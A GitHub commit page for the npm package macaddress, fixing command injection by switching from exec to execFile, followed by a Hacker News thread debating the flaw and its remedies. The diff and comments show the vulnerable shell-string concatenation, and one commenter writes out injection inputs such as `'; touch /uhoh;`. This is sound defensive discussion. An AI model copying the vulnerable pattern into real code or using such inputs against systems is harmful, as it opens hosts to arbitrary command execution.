  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fscravy%2Fnode-macaddress%2Fcommit%2F358fd594adb196a86b94ac9c691f69fe5dad2332)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=scravy%2Fnode-macaddress)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[scravy](/scravy)
/
**[node-macaddress](/scravy/node-macaddress)**
Public

* [Notifications](/login?return_to=%2Fscravy%2Fnode-macaddress) You must be signed in to change notification settings
* [Fork
  39](/login?return_to=%2Fscravy%2Fnode-macaddress)
* [Star
   143](/login?return_to=%2Fscravy%2Fnode-macaddress)

* [Code](/scravy/node-macaddress)
* [Issues
  2](/scravy/node-macaddress/issues)
* [Pull requests
  1](/scravy/node-macaddress/pulls)
* [Actions](/scravy/node-macaddress/actions)
* [Projects
  0](/scravy/node-macaddress/projects)
* [Wiki](/scravy/node-macaddress/wiki)
* [Security](/scravy/node-macaddress/security)
* [Insights](/scravy/node-macaddress/pulse)

Additional navigation options

* [Code](/scravy/node-macaddress)
* [Issues](/scravy/node-macaddress/issues)
* [Pull requests](/scravy/node-macaddress/pulls)
* [Actions](/scravy/node-macaddress/actions)
* [Projects](/scravy/node-macaddress/projects)
* [Wiki](/scravy/node-macaddress/wiki)
* [Security](/scravy/node-macaddress/security)
* [Insights](/scravy/node-macaddress/pulse)

## Commit

[Permalink](/scravy/node-macaddress/commit/358fd594adb196a86b94ac9c691f69fe5dad2332)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Merge pull request [#20](https://github.com/scravy/node-macaddress/pull/20) from flypapertech/fixCommandInjection

[Browse files](/scravy/node-macaddress/tree/358fd594adb196a86b94ac9c691f69fe5dad2332)
Browse the repository at this point in the history

```
Fixes arbitrary command injection by using execFile instead of exec
```

* Loading branch information

[![@scravy](https://avatars.githubusercontent.com/u/295504?s=40&v=4)](/scravy)

[scravy](/scravy/node-macaddress/commits?author=scravy "View all commits by scravy")
authored
Jun 23, 2018

2 parents
[dd07962](/scravy/node-macaddress/commit/dd079620d11c91957ac897e88d539dfceec41d56)
+
[214ad00](/scravy/node-macaddress/commit/214ad005bc8612f40eab9a2006e0e2ea0bd16cc1)

commit 358fd59

 Show file tree

 Hide file tree

Showing
**6 changed files**
with
**11 additions**
and
**24 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* .travis.yml
  [.travis.yml](#diff-6ac3f79fc25d95cd1e3d51da53a4b21b939437392578a35ae8cd6d5366ca5485)
* lib

  + lib/linux.js
    [linux.js](#diff-fb3c2cce0f57c5c6b8e853f622d44b15fa502f04212c18b2a050f9ddac0a7f7f)
  + lib/macosx.js
    [macosx.js](#diff-c8d9b05f5823b2b7f43344dc340f753f0d20e73f77b45d90f7702b88e3d4f88c)
  + lib/unix.js
    [unix.js](#diff-065eaf69638f20ea2a76fe2137bbe81eedc43f2d7c91395b0b6a4c01cde93321)
  + lib/windows.js
    [windows.js](#diff-26b75a635f124d2b9e6537c2b58d8cc31420031b1233cafa420bc1e57bff7a99)
* package.json
  [package.json](#diff-7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519)

## There are no files selected for viewing

3 changes: 3 additions & 0 deletions

3
[.travis.yml](#diff-6ac3f79fc25d95cd1e3d51da53a4b21b939437392578a35ae8cd6d5366ca5485 ".travis.yml")

Show comments

[View file](/scravy/node-macaddress/blob/358fd594adb196a86b94ac9c691f69fe5dad2332/.travis.yml)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,7 @@ |
|  |  | language: node\_js |
|  |  | os: |
|  |  | - linux |
|  |  | - osx |
|  |  | node\_js: |
|  |  | - stable |
|  |  | - "0.12" |
| Expand Down | |  |

6 changes: 3 additions & 3 deletions

6
[lib/linux.js](#diff-fb3c2cce0f57c5c6b8e853f622d44b15fa502f04212c18b2a050f9ddac0a7f7f "lib/linux.js")

Show comments

[View file](/scravy/node-macaddress/blob/358fd594adb196a86b94ac9c691f69fe5dad2332/lib/linux.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,11 +1,11 @@ |
|  |  | var exec = require('child\_process').exec; |
|  |  | var execFile = require('child\_process').execFile; |
|  |  |  |
|  |  | module.exports = function (iface, callback) { |
|  |  | exec("cat /sys/class/net/" + iface + "/address", function (err, out) { |
|  |  | execFile("cat", ["/sys/class/net/" + iface + "/address"], function (err, out) { |
|  |  | if (err) { |
|  |  | callback(err, null); |
|  |  | return; |
|  |  | } |
|  |  | callback(null, out.trim().toLowerCase()); |
|  |  | }); |
|  |  | }; |
|  |  | }; |

16 changes: 0 additions & 16 deletions

16
[lib/macosx.js](#diff-c8d9b05f5823b2b7f43344dc340f753f0d20e73f77b45d90f7702b88e3d4f88c "lib/macosx.js")

Show comments

[View file](/scravy/node-macaddress/blob/dd079620d11c91957ac897e88d539dfceec41d56/lib/macosx.js)
Edit file

Delete file

Load diff

This file was deleted.

Oops, something went wrong.

Retry

4 changes: 2 additions & 2 deletions

4
[lib/unix.js](#diff-065eaf69638f20ea2a76fe2137bbe81eedc43f2d7c91395b0b6a4c01cde93321 "lib/unix.js")

Show comments

[View file](/scravy/node-macaddress/blob/358fd594adb196a86b94ac9c691f69fe5dad2332/lib/unix.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,7 +1,7 @@ |
|  |  | var exec = require('child\_process').exec; |
|  |  | var execFile = require('child\_process').execFile; |
|  |  |  |
|  |  | module.exports = function (iface, callback) { |
|  |  | exec("ifconfig " + iface, function (err, out) { |
|  |  | execFile("ifconfig", [iface], function (err, out) { |
|  |  | if (err) { |
|  |  | callback(err, null); |
|  |  | return; |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[lib/windows.js](#diff-26b75a635f124d2b9e6537c2b58d8cc31420031b1233cafa420bc1e57bff7a99 "lib/windows.js")

Show comments

[View file](/scravy/node-macaddress/blob/358fd594adb196a86b94ac9c691f69fe5dad2332/lib/windows.js)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,4 +1,4 @@ |
|  |  | var exec = require('child\_process').exec; |
|  |  | var execFile = require('child\_process').execFile; |
|  |  |  |
|  |  | var regexRegex = /[-\/\\^$\*+?.()|[\]{}]/g; |
|  |  |  |
| Expand All | | @@ -7,7 +7,7 @@ function escape(string) { |
|  |  | } |
|  |  |  |
|  |  | module.exports = function (iface, callback) { |
|  |  | exec("ipconfig /all", function (err, out) { |
|  |  | execFile("ipconfig", ["/all"], function (err, out) { |
|  |  | if (err) { |
|  |  | callback(err, null); |
|  |  | return; |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[package.json](#diff-7ae45ad102eab3b6d7e7896acd08c427a9b25b346470d7bc6507b6481575d519 "package.json")

Show comments

[View file](/scravy/node-macaddress/blob/358fd594adb196a86b94ac9c691f69fe5dad2332/package.json)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,6 +1,6 @@ |
|  |  | { |
|  |  | "name": "macaddress", |
|  |  | "version": "0.2.9", |
|  |  | "version": "0.2.10", |
|  |  | "description": "Get the MAC addresses (hardware addresses) of the hosts network interfaces.", |
|  |  | "main": "index.js", |
|  |  | "scripts": { |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `358fd59`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fscravy%2Fnode-macaddress%2Fcommit%2F358fd594adb196a86b94ac9c691f69fe5dad2332) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from news.ycombinator.com_b85ce597_20250125_131432.html ===


| |  | **[Hacker News](news)** [new](newest) | [past](front) | [comments](newcomments) | <ask> | <show> | <jobs> | <submit> | [login](login?goto=item%3Fid%3D17283394) | | --- | --- | --- | |
| --- | --- | --- | --- |
|
| |  |  | [Critical vulnerability of NPM package macaddress](https://nodesecurity.io/advisories/654) ([nodesecurity.io](from?site=nodesecurity.io)) | | --- | --- | --- | |  | | 88 points by [tekkk](user?id=tekkk) [on June 11, 2018](item?id=17283394)  | [hide](hide?id=17283394&goto=item%3Fid%3D17283394) | [past](https://hn.algolia.com/?query=Critical%20vulnerability%20of%20NPM%20package%20macaddress&type=story&dateRange=all&sort=byDate&storyText=false&prefix&page=0) | [favorite](fave?id=17283394&auth=fed13a4fc2e5db07bf64a9ca0df0b645b19dedff) | [92 comments](item?id=17283394) |  | |  |  | [koolba](user?id=koolba) [on June 11, 2018](item?id=17283861)   | [next](#17284430) [–]  Here's the offending line of code[1]: ```      exec("cat /sys/class/net/" + iface + "/address", function (err, out) {  ``` That's some serious amateur hour and may even be a new contender for the Useless Use of Cat (and "exec(...)") Award. Would be simpler and less error prone to just read the file via fs.readFile(...) after verifying that the iface parameter does not contain a directory separator. [1]: [https://github.com/scravy/node-macaddress/blob/dd079620d11c9...](https://github.com/scravy/node-macaddress/blob/dd079620d11c91957ac897e88d539dfceec41d56/lib/linux.js#L4) | | --- | --- | --- | | | --- | --- | --- | --- | | |  |  | [MrLeap](user?id=MrLeap) [on June 11, 2018](item?id=17283888)   | [parent](#17283861) | [next](#17284575) [–]  Yeah, that's dirty. I hate to be an apologist for this kind of thing, but this vulnerability is in the same time zone to me as saying mysql2 has a critical vulnerability if attackers get access to connection.query's first argument. The package definitely should be updated, and I appreciate being informed, but "No fix is currently available for this vulnerability" strikes me as a little disingenuous. Object.Freeze a list of iface options, and validate user input against that.. Wouldn't that prevent this attack? | | --- | --- | --- | | | |  |  | [mikeash](user?id=mikeash) [on June 11, 2018](item?id=17284027)   | [root](#17283861) | [parent](#17283888) | [next](#17283927) [–]  Someone familiar with databases and SQL will understand that giving an attacker direct access to write a query is going to make you vulnerable, even with zero knowledge of how the thing is implemented. A function for retrieving a MAC address does not have the same expectation. Without knowing how it’s inplemented, it’s quite reasonable to expect such a function to behave sanely on arbitrary input. | | --- | --- | --- | | | |  |  | [arghwhat](user?id=arghwhat) [on June 11, 2018](item?id=17283927)   | [root](#17283861) | [parent](#17283888) | [prev](#17284027) | [next](#17284575) [–]  The correct thing to do is either not use the library, or to restrict usage by never pass arbitrary user-controllable data to it. Whitelisting would definitely work, as long as the whitelist cannot be externally manipulated. Don't expose the whitelist rather than relying on Object.Freeze. | | --- | --- | --- | | | |  |  | [Mister\_Snuggles](user?id=Mister_Snuggles) [on June 11, 2018](item?id=17284575)   | [parent](#17283861) | [prev](#17283888) | [next](#17284648) [–]  Don't forget the just-as-bad-but-maybe-worse version for the generic Unix[0] platform. The Mac OS X version[1] is equally bad. Ironically, I don't see this problem in the Windows version[2]. [0] [https://github.com/scravy/node-macaddress/blob/dd079620d11c9...](https://github.com/scravy/node-macaddress/blob/dd079620d11c91957ac897e88d539dfceec41d56/lib/unix.js) [1] [https://github.com/scravy/node-macaddress/blob/dd079620d11c9...](https://github.com/scravy/node-macaddress/blob/dd079620d11c91957ac897e88d539dfceec41d56/lib/macosx.js) [2] [https://github.com/scravy/node-macaddress/blob/dd079620d11c9...](https://github.com/scravy/node-macaddress/blob/dd079620d11c91957ac897e88d539dfceec41d56/lib/windows.js) | | --- | --- | --- | | | |  |  | [koolba](user?id=koolba) [on June 11, 2018](item?id=17284677)   | [root](#17283861) | [parent](#17284575) | [next](#17284648) [–]  I think the Windows code may be broken as well though for entirely different reason. It doesn't handle overlapping names of network interfaces. It searches for the first occurrence of the text of iface[1] in the output and then returns the next macaddress-ish text it finds. That means "Local Area Connection" will also match "Local Area Connection 2", "Local Area Connection 3", etc and the sort order of the ipconfig command will determine which one you will return. [1]: [https://github.com/scravy/node-macaddress/blob/dd079620d11c9...](https://github.com/scravy/node-macaddress/blob/dd079620d11c91957ac897e88d539dfceec41d56/lib/windows.js#L15) | | --- | --- | --- | | | |  |  | [tomxor](user?id=tomxor) [on June 11, 2018](item?id=17284648)   | [parent](#17283861) | [prev](#17284575) | [next](#17285328) [–]  Nodejs API docs for exec say: > Never pass unsanitized user input to this function. Any input containing shell metacharacters may be used to trigger arbitrary command execution. I've always wondered what exactly the best way to do this is... searching about sanitising user input into shells always results in suggestions for something quite extreme like stripping non-alphanumerics or something similar. But much of the time user inputs are just passed as parameters or built into paths as in this case, so I wondered, is it enough to quote them instead? we don't need the features of double quotes when building the string in some other language in which case the rules for single quotes apply: From GNU Bash 3.1.2.2 Single Quotes: > Enclosing characters in single quotes (‘'’) preserves the literal value of each character within the quotes. A single quote may not occur between single quotes, even when preceded by a backslash. In which case is it possible to get away with just "sanitizing" for single quote usage and then single quote all paramaters?: ```     exec(`cat '/sys/class/net/${iface.replace(/'/g, '')}/address'`, () => {})  ``` Is it possible to break out of that? I think in order to use && or ; to start a new command you need to end the context of the string, but .replace(/'/g, '') seems to remove that ability? e.g ```     iface = `'; touch /uhoh;`  ``` results in the following string passed to exec ```     cat '/sys/class/net/; touch /uhoh;/address'      => cat: '/sys/class/net/; touch /uhoh/address': No such file or directory  ``` Also you can't do further exec inside single quotes with backticks e.g ```     cat '/sys/class/net/` touch /uhoh `/address'      => cat: '/sys/class/net/`touch /uhoh`/address': No such file or directory ``` | | --- | --- | --- | | | |  |  | [koolba](user?id=koolba) [on June 11, 2018](item?id=17284789)   | [root](#17283861) | [parent](#17284648) | [next](#17285244) [–]  Escaping and quoting is the wrong way to go. Even if it works you're technically not totally correct as you can't reference my network interface named "bad'name"[1]. If you can avoid fork/exec you're always better off. In this case reading the file directly is fine. I can't think of a valid reason to fork and invoke cat. If you have a legit reason to fork and run then use execFile(...) as you can pass the arguments as an actual array. No escaping needed as it gets passed in total without shell parsing of args. Your example would be something like: ```     execFile('/bin/cat', ['--', `/sys/class/net/${iface}/address`,], (error, stdout, stderr) => { ... })  ``` Though that has the issue of being able to pass in ../../../ and read a file named "address" anywhere on the filesystem. Should also add in a regex validation that no directory separators are in the text of iface. [1]: Yes this sounds stupid but it's a valid file name. A more realistic one may be something like "Alice's Wi-Fi". [2]: [https://nodejs.org/api/child\_process.html#child\_process\_chil...](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) | | --- | --- | --- | | | |  |  | [tomxor](user?id=tomxor) [on June 11, 2018](item?id=17285006)   | [root](#17283861) | [parent](#17284789) | [next](#17285244) [–]  > Escaping and quoting is the wrong way to go. Even if it works you're technically not totally correct as you can't reference my network interface named "bad'name"[1]. If you can avoid fork/exec you're always better off. In this case reading the file directly is fine. I can't think of a valid reason to fork and invoke cat. Yes I get that, I should have clarified: in the general use of exec (i.e a valid and necessary use). > If you have a legit reason to fork and run then use execFile(...) You are absolutely right, execFile is a much better way, I've used it before and I guess you are right - in \_most\_ cases this should be the #1 choice. [edited] - irrelevant details of obscure case where execFile isn't enough. Anyway, in a case where exec through a shell is necessary for some reason, i'm wondering if this method of single quoting is actually safe or not, as far as I can see it is, but i'm not a security expert. | | --- | --- | --- | | | |  |  | [xorcist](user?id=xorcist) [on June 11, 2018](item?id=17285244)   | [root](#17283861) | [parent](#17284648) | [prev](#17284789) | [next](#17290429) [–]  Quoted exactly right, it will not be exploitable. However, this amounts to declaring which input is *dis*allowed, generally not a good idea. It is preferrable to declare which input is allowed. In this case, matters are worse because without knowing which shell we are running under and which cat we are executing it is impossible to know the complete list of dangerous characters. (In fact, if some sloppy sysadmin have a dot in the search path, the cat binary might even be attacker uploaded.) (The fact that cat is even in there is of course doubly insane. They start an extra process just to make reading the data slightly more complicated.) | | --- | --- | --- | | | |  |  | [tomxor](user?id=tomxor) [on June 11, 2018](item?id=17286121)   | [root](#17283861) | [parent](#17285244) | [next](#17290429) [–]  Thanks > matters are worse because without knowing which shell we are running under The shell in exec can be configured, it's /bin/sh by default but of course this is linked to all kinds of different things on different OS, ubuntu links to dash, used to be bash, FreeBSD has a "proper" sh. I suppose if going through a shell was somehow necessary you could try to be more secure by specifying a absolute path to a shell but... > In fact, if some sloppy sysadmin have a dot in the search path, the cat binary might even be attacker uploaded. :P I feel like it's game over at that point, is there really any point in worrying about library security when the $PATH has been effectively hijacked? | | --- | --- | --- | | | |  |  | [xorcist](user?id=xorcist) [on June 11, 2018](item?id=17286718)   | [root](#17283861) | [parent](#17286121) | [next](#17290429) [–]  > is there really any point in worrying about library security when the $PATH has been effectively hijacked? Well, there might be legitimate (although somewhat misguided) reasons for someone to do that. People routinely do similar things in dev environments all the time. I can absolutely see how it could reach production. If you don't expect your web app to launch shell scripts you might not even think about it. It's the small things, which in themselves might not be serious or even noteworthy, which compound together to deliver the nasty surprises. | | --- | --- | --- | | | |  |  | [yes\_or\_gnome](user?id=yes_or_gnome) [on June 12, 2018](item?id=17290429)   | [root](#17283861) | [parent](#17284648) | [prev](#17285244) | [next](#17284765) [–]  I'm not a JS developer, so this as much of a question as it is a statement. `exec` is a system call and doesn't call bash or any other shell. At least, it shouldn't. If it does, then it would be wrong to assume that bash is even available. Either way. The single quote sytax is specific to bash (and maybe sh, dash, etc. I'm not certain.) so, don't rely upon it. | | --- | --- | --- | | | |  |  | [tomxor](user?id=tomxor) [on June 12, 2018](item?id=17292798)   | [root](#17283861) | [parent](#17290429) | [next](#17284765) [–]  You are describing execFile in nodejs which directly spawns a binary into a child process and explicitly passes each argument from an array (Other's here have mentioned it's the prefered way as it obviously avoids any arbitrary execution potential of going through a shell)... exec is not a system call in nodejs, it's just a convenience function that sets up a child process and spawns a shell (of your choosing) and then passes the first argument as the single command. | | --- | --- | --- | | | |  |  | [alxlaz](user?id=alxlaz) [on June 11, 2018](item?id=17284765)   | [root](#17283861) | [parent](#17284648) | [prev](#17290429) | [next](#17285328) [–]  In this particular case, you know the result has to be a subpath under /sys/class/net/... and, specifically, an interface name. I'm 95% sure that, if it's not alphanumeric, you can safely throw it out (and the other 5% is in the kernel and udev docs). | | --- | --- | --- | | | |  |  | [tomxor](user?id=tomxor) [on June 11, 2018](item?id=17284807)   | [root](#17283861) | [parent](#17284765) | [next](#17285328) [–]  > In this particular case, you know the result has to be a subpath under /sys/class/net I get that in \_this\_ case, but I'm talking more generally, sometimes parameters are allowed to or even need to have various other non alphanumeric chars, and then you start going down the fallible road of differentiation... trying to sanitise not quite everything without letting exploits pass through which is dangerous. But in the more general case of "it's a parameter" can't we just quote it, sanitise for single quotes and then know it's safe? | | --- | --- | --- | | | |  |  | [amluto](user?id=amluto) [on June 11, 2018](item?id=17285328)   | [parent](#17283861) | [prev](#17284648) | [next](#17285373) [–]  > after verifying that the iface parameter does not contain a directory separator. No, this is terrible practice. The correct solution is to verify that the interface name is well formed. Use a whitelist, not a blacklist. And, for good measure, use a real path manipulation library if available. | | --- | --- | --- | | | |  |  | [movablesed](user?id=movablesed) [on June 11, 2018](item?id=17285572)   | [root](#17283861) | [parent](#17285328) | [next](#17285373) [–]  How are you going to white-list network-interface names? On Linux at least you can name them almost anything you want: ```   % sudo ip link set eth3 down   % sudo ip link set eth3 name "'deal-with-it'"   % sudo ip link show "'deal-with-it'"   5: 'deal-with-it': <BROADCAST,MULTICAST> mtu 1500 qdisc mq state DOWN mode DEFAULT group default qlen 10000       link/ether xx:xx:xx:xx:xx:xx brd ff:ff:ff:ff:ff:ff  ``` The only interface-name restrictions iproute2 sets is that they can't contain NUL, slash, or white space, and they can't be longer than 15 characters. | | --- | --- | --- | | | |  |  | [tedunangst](user?id=tedunangst) [on June 11, 2018](item?id=17285814)   | [root](#17283861) | [parent](#17285572) | [next](#17305731) [–]  So I guess the question is does a regex of [^/ ]{1,15} count as a whitelist or a blacklist? | | --- | --- | --- | | | |  |  | [amluto](user?id=amluto) [on June 13, 2018](item?id=17305731)   | [root](#17283861) | [parent](#17285572) | [prev](#17285814) | [next](#17285373) [–]  So does Linux allow .. as an interface name? If so, that’s nuts. | | --- | --- | --- | | | |  |  | [furgooswft13](user?id=furgooswft13) [on June 11, 2018](item?id=17285373)   | [parent](#17283861) | [prev](#17285328) | [next](#17285056) [–]  Yikes. Even if fixed I would be highly suspect of the rest of the code written by someone who felt they needed an exec call to *read a file*. Perhaps I should make a new npm module named cat ```     module.exports = require('fs').readFile;  ``` and saved the day. | | --- | --- | --- | | | |  |  | [tomxor](user?id=tomxor) [on June 11, 2018](item?id=17286264)   | [root](#17283861) | [parent](#17285373) | [next](#17285056) [–]  You joke but I've come across many one line modules in the npm registry... usually when trying to figure out if I trust the tree of some prospective module i'm considering including in my code - It's a serious problem for module authors because most aren't even aware they are including all of this crap, they see the first level of dependencies looks fairly reasonable, but you have to keep digging and then you find all kinds of crazy ridiculous things just because one otherwise reasonable person in the chain didn't quite look closely enough at something they were depending on which opened up a doorway to hell. My general rule is to just avoid trees deeper than a few levels unless there is a very good reason (unless i'm creating a public module in which case I aim for zero, usually end up with 1 or 2 one level dependencies) - most node modules are the unix philosophy taken way too far, every pattern is bad when incorrectly used. | | --- | --- | --- | | | |  |  | [Boulth](user?id=Boulth) [on June 11, 2018](item?id=17285056)   | [parent](#17283861) | [prev](#17285373) | [next](#17283900) [–]  This is kind of embarrassing but the advisories page is full of gems like that: <https://nodesecurity.io/advisories> | | --- | --- | --- | | | |  |  | [\_rrnv](user?id=_rrnv) [on June 11, 2018](item?id=17285395)   | [root](#17283861) | [parent](#17285056) | [next](#17283900) [–]  I'm shocked. There are almost 30 advisories in May alone that are 7+. To put this into perspective Perl, which I like, with its modules had 3 this year. And 3 last year. Three per year. Three. [https://www.cvedetails.com/vulnerability-list/vendor\_id-1885...](https://www.cvedetails.com/vulnerability-list/vendor_id-1885/Perl.html) | | --- | --- | --- | | | |  |  | [staticassertion](user?id=staticassertion) [on June 11, 2018](item?id=17285763)   | [root](#17283861) | [parent](#17285395) | [next](#17283900) [–]  Counting vulnerabilities is entirely useless. You can easily attribute more vulns to *better* security, as it may indicate a larger/ better group of people are looking for vulnerabilities. I actually find that is *generally* the case. | | --- | --- | --- | | | |  |  | [\_rrnv](user?id=_rrnv) [on June 11, 2018](item?id=17286028)   | [root](#17283861) | [parent](#17285763) | [next](#17283900) [–]  Generally, how much vulnerabilities is too much? I think Node is past this point. | | --- | --- | --- | | | |  |  | [staticassertion](user?id=staticassertion) [on June 11, 2018](item?id=17286257)   | [root](#17283861) | [parent](#17286028) | [next](#17283900) [–]  There is no limit - as I said, counting is pointless. As an example, lots of projects have active bug bounty programs where they *pay* people to disclose vulns. This generates more CVEs than a competing product that does not pay for more vulns. Would we then call the project with a bug bounty program *less* secure? I'd hope not. Alternatively, what about impact? Maybe 100 DOS's is less serious than 5 RCE's, or 10 privescs is more serious than 1 RCE? How do we convert between these severities to understand risk? Counting vulns is pointless. | | --- | --- | --- | | | |  |  | [\_rrnv](user?id=_rrnv) [on June 11, 2018](item?id=17286933)   | [root](#17283861) | [parent](#17286257) | [next](#17283900) [–]  I think comparing is pointless. You are correct that a project with a small number of vulns is no more secure than the one with a high number of vulns. But counting seem sensible - if a project spills major vulns at a continuous rate it means two things: the overall codebase is not improving, and who knows how many more vulns there are. It's not something to be happy about. | | --- | --- | --- | | | |  |  | [staticassertion](user?id=staticassertion) [on June 11, 2018](item?id=17287411)   | [root](#17283861) | [parent](#17286933) | [next](#17283900) [–]  I disagree for exactly the reasons I've stated - "more vulns" doesn't take impact into account. "More vulns" doesn't take who is reporting them into account (internal? paid pentester?). These things matter a lot. Again, look at projects that pay for vulns. They have hundreds a year - this is a good thing. They come in at a continuous rate. Counting is pointless. | | --- | --- | --- | | | |  |  | [arghwhat](user?id=arghwhat) [on June 11, 2018](item?id=17283900)   | [parent](#17283861) | [prev](#17285056) | [next](#17283944) [–]  This is so awful that its existence is borderline suspicious. It's also conveniently just part of a massive "v1.0" (initial commit). | | --- | --- | --- | | | |  |  | [drdaeman](user?id=drdaeman) [on June 11, 2018](item?id=17283938)   | [root](#17283861) | [parent](#17283900) | [next](#17285488) [–]  Other platforms do `exec` calls, e.g. `"ifconfig " + iface`, etc. This `cat` is odd, but still within what can be attributed to sloppiness (and copy-paste-driven programming) rather than malice. | | --- | --- | --- | | | |  |  | [arghwhat](user?id=arghwhat) [on June 11, 2018](item?id=17284085)   | [root](#17283861) | [parent](#17283938) | [next](#17285488) [–]  exec cat is so odd that I can't seriously attribute it to sloppiness. It's for reading a file, and much more cumbersome. Plus, exec is not something to be taken lightly, to the point where I'd barf if I found out a lib I depended on exec'd internally and immediately remove it, unless there was absolutely no other way to perform the action for some absurd reason. | | --- | --- | --- | | | |  |  | [nucleardog](user?id=nucleardog) [on June 11, 2018](item?id=17287560)   | [root](#17283861) | [parent](#17284085) | [next](#17286871) [–]  Somebody Google'd "get mac address from script linux" and scrolled through a couple things involving awk and other nonsense until they found something easily digestible--a StackOverflow answer saying: ```     For particular interface like for eth0:     cat /sys/class/net/eth0/address  ``` Then without thought or understanding, put that into their JavaScript as directly as possible. This is someone doing work without a full understanding of the problem space. Less of a programmer, more of a programming technologist. I don't find it surprising at all. | | --- | --- | --- | | | |  |  | [arghwhat](user?id=arghwhat) [on June 12, 2018](item?id=17291541)   | [root](#17283861) | [parent](#17287560) | [next](#17286871) [–]  Hmm, an adequate explanation, but why in the world is someone making a public library out of that, and furthermore, why in the world are people *using* this library? The library has been downloaded 2300 times in the past year! I have nothing against bad developers—we all started there—but there is something seriously wrong with the JavaScript ecosystem and the barrier of entry for pushing your code into other people's projects through libraries. | | --- | --- | --- | | | |  |  | [drdaeman](user?id=drdaeman) [on June 11, 2018](item?id=17286871)   | [root](#17283861) | [parent](#17284085) | [prev](#17287560) | [next](#17285488) [–]  My point is, it's likely that the first line was something like exec("ifconfig " + name), then it was copied and edited to exec("networksetup -getmacaddress"), then this exec("cat") had happened. Because laziness. It really wouldn't be a problem (a poor and ineffective code for sure, but no security bugs), if all the arguments would be correctly validated (and escaped, although valid interface names probably don't need it). | | --- | --- | --- | | | |  |  | [caymanjim](user?id=caymanjim) [on June 11, 2018](item?id=17285488)   | [root](#17283861) | [parent](#17283900) | [prev](#17283938) | [next](#17283944) [–]  Never attribute to malice that which is adequately explained by stupidity. | | --- | --- | --- | | | |  |  | [arghwhat](user?id=arghwhat) [on June 12, 2018](item?id=17291522)   | [root](#17283861) 